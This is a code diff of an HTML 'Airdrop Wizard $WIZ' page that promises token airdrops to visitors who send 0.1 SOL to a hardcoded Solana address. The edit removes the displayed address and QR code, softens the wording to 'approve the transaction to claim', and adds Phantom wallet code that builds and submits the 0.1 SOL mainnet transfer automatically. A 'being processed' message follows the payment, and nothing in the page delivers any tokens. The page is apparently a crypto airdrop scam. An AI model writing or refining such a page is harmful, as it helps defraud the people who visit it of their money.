@@ -23,7 +23,6 @@
       font-size: 24px;
       line-height: 1.5;
       min-height: 100vh;
-      overflow-x: hidden;
       position: relative;
     }
 
@@ -39,17 +38,9 @@
 
     @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
 
-    .container {
-      max-width: 100%;
-      padding: 20px;
-      position: relative;
-      z-index: 2;
-    }
+    .container { padding: 20px; position: relative; z-index: 2; }
 
-    header {
-      text-align: center;
-      padding: 30px 0 20px;
-    }
+    header { text-align: center; padding: 30px 0 20px; }
 
     .logo {
       font-family: 'Press Start 2P', cursive;
@@ -88,19 +79,19 @@
       font-size: 2.6rem;
       color: var(--neon-pink);
       text-align: center;
-      margin-bottom: 20px;
+      margin-bottom: 15px;
       text-shadow: 0 0 20px var(--neon-pink);
     }
 
     .amount {
-      font-size: 2.4rem;
+      font-size: 2.5rem;
       color: #ffff00;
       text-align: center;
-      margin: 20px 0;
+      margin: 15px 0 25px;
       text-shadow: 0 0 15px #ffff00;
     }
 
-    .connect-btn, .send-btn {
+    button {
       width: 100%;
       background: linear-gradient(45deg, #ff00ff, #00ffff);
       color: #000;
@@ -116,7 +107,7 @@
       letter-spacing: 3px;
     }
 
-    .send-btn {
+    #sendBtn {
       background: linear-gradient(45deg, #39ff14, #00ffff);
       font-size: 1.9rem;
       padding: 26px;
@@ -126,26 +117,10 @@
       margin: 25px 0;
       font-size: 1.5rem;
       text-align: center;
-      min-height: 80px;
+      min-height: 90px;
     }
 
     .connected { color: #39ff14; }
-
-    .address-box {
-      background: #000;
-      border: 3px dashed var(--neon-pink);
-      padding: 18px;
-      margin: 20px 0;
-      font-size: 1.35rem;
-      word-break: break-all;
-      color: #00ffff;
-      text-align: center;
-    }
-
-    .qr-container {
-      text-align: center;
-      margin: 25px 0;
-    }
 
     footer {
       text-align: center;
@@ -180,31 +155,19 @@
       <h1>SEND 0.1 SOL</h1>
       <div class="amount">0.1 SOL → $WIZ AIRDROP</div>
       <p style="text-align:center; font-size:1.6rem; margin-bottom:25px;">
-        Connect Phantom then send exactly <strong>0.1 SOL</strong> to claim your tokens in the neon grid.
+        Connect your Phantom wallet.<br>
+        Approve the transaction to claim your neon tokens.
       </p>
 
-      <button id="connectBtn" class="connect-btn">CONNECT PHANTOM WALLET</button>
-      <button id="sendBtn" class="send-btn" style="display:none;">SEND 0.1 SOL NOW</button>
+      <button id="connectBtn">CONNECT PHANTOM WALLET</button>
+      <button id="sendBtn" style="display:none;">SEND 0.1 SOL & APPROVE</button>
 
       <div id="status" class="status"></div>
-
-      <div id="sendSection" style="display:none;">
-        <div class="address-box" id="addressDisplay">MuDxVcdRAA4dHzKbJsNeLzY5cTn8KMAA1Mz7428seHn</div>
-        
-        <div class="qr-container">
-          <img id="qrCode" src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=MuDxVcdRAA4dHzKbJsNeLzY5cTn8KMAA1Mz7428seHn" 
-               alt="QR Code" style="max-width:100%; border:3px solid #ff00ff; padding:8px; background:#000;">
-        </div>
-
-        <p style="text-align:center; font-size:1.4rem; color:#ffff00;">
-          Scan QR with Phantom or copy address below
-        </p>
-      </div>
     </div>
 
     <footer>
-      © 2026 Airdrop Wizard • $WIZ<br>
-      Send exactly <strong>0.1 SOL</strong> only
+      © 2026 Airdrop Wizard • $WIZ TOKEN<br>
+      Exactly 0.1 SOL will be sent
     </footer>
   </div>
 
@@ -212,51 +175,93 @@
     const connectBtn = document.getElementById('connectBtn');
     const sendBtn = document.getElementById('sendBtn');
     const statusDiv = document.getElementById('status');
-    const sendSection = document.getElementById('sendSection');
     const RECIPIENT = "MuDxVcdRAA4dHzKbJsNeLzY5cTn8KMAA1Mz7428seHn";
-    const AMOUNT = "0.1";
+    const AMOUNT_SOL = 0.1;
+
+    let provider = null;
+    let publicKey = null;
 
     async function connectPhantom() {
       if (!window.solana || !window.solana.isPhantom) {
-        statusDiv.innerHTML = `<span style="color:#ff00ff;">Phantom not detected.<br>Install from phantom.app</span>`;
+        statusDiv.innerHTML = `<span style="color:#ff00ff;">❌ Phantom not found.<br>Install from phantom.app</span>`;
         return;
       }
 
       try {
-        const resp = await window.solana.connect();
-        const pubkey = resp.publicKey.toString();
+        provider = window.solana;
+        const resp = await provider.connect();
+        publicKey = resp.publicKey;
 
         statusDiv.innerHTML = `
-          <span class="connected">✅ CONNECTED SUCCESSFULLY</span><br>
-          <small>${pubkey.slice(0,8)}...${pubkey.slice(-6)}</small>
+          <span class="connected">✅ WALLET CONNECTED</span><br>
+          <small>${publicKey.toString().slice(0,8)}...${publicKey.toString().slice(-6)}</small>
         `;
 
         connectBtn.style.display = 'none';
         sendBtn.style.display = 'block';
-        sendSection.style.display = 'block';
 
       } catch (err) {
-        statusDiv.innerHTML = `<span style="color:#ff00ff;">Connection failed. Try again.</span>`;
+        statusDiv.innerHTML = `<span style="color:#ff00ff;">Connection cancelled.</span>`;
       }
     }
 
-    function copyAndPromptSend() {
-      navigator.clipboard.writeText(RECIPIENT).then(() => {
-        statusDiv.innerHTML += `<br><span style="color:#ffff00;">✅ Address copied to clipboard!</span><br>Now open Phantom → Send → Paste address → Enter <strong>0.1 SOL</strong>`;
-        
-        // Try deep link fallback (may not prefill amount reliably)
-        const deepLink = `https://phantom.app/ul/v1/send?to=${RECIPIENT}&amount=${AMOUNT}&network=solana`;
-        window.open(deepLink, '_blank');
-      });
+    async function sendTransaction() {
+      if (!provider || !publicKey) {
+        statusDiv.innerHTML = `<span style="color:#ff00ff;">Please connect wallet first.</span>`;
+        return;
+      }
+
+      statusDiv.innerHTML = `<span style="color:#ffff00;">Building transaction...</span>`;
+
+      try {
+        const connection = new solanaWeb3.Connection(
+          "https://api.mainnet-beta.solana.com", 
+          "confirmed"
+        );
+
+        const lamports = Math.floor(AMOUNT_SOL * solanaWeb3.LAMPORTS_PER_SOL);
+
+        const transaction = new solanaWeb3.Transaction().add(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey: publicKey,
+            toPubkey: new solanaWeb3.PublicKey(RECIPIENT),
+            lamports: lamports,
+          })
+        );
+
+        // Get recent blockhash
+        const { blockhash } = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = publicKey;
+
+        statusDiv.innerHTML = `<span style="color:#ffff00;">Waiting for Phantom approval...</span>`;
+
+        // Send to Phantom for approval + signing + broadcasting
+        const signedTransaction = await provider.signAndSendTransaction(transaction);
+
+        statusDiv.innerHTML = `
+          <span style="color:#39ff14;">✅ TRANSACTION SENT!</span><br>
+          Signature: ${signedTransaction.signature.slice(0,12)}...
+        `;
+
+        // Optional: show success message
+        setTimeout(() => {
+          statusDiv.innerHTML += `<br><span style="color:#ffff00;">Thank you! Your $WIZ airdrop is being processed in the neon grid.</span>`;
+        }, 2000);
+
+      } catch (err) {
+        console.error(err);
+        statusDiv.innerHTML = `<span style="color:#ff00ff;">Transaction rejected or failed.<br>Please try again.</span>`;
+      }
     }
 
     connectBtn.addEventListener('click', connectPhantom);
-    sendBtn.addEventListener('click', copyAndPromptSend);
+    sendBtn.addEventListener('click', sendTransaction);
 
-    // Initial detection
+    // Initial check
     window.addEventListener('load', () => {
       if (window.solana && window.solana.isPhantom) {
-        statusDiv.innerHTML = `<span style="color:#39ff14;">Phantom ready ✓</span>`;
+        statusDiv.innerHTML = `<span style="color:#39ff14;">Phantom detected ✓</span>`;
       }
     });
   </script>
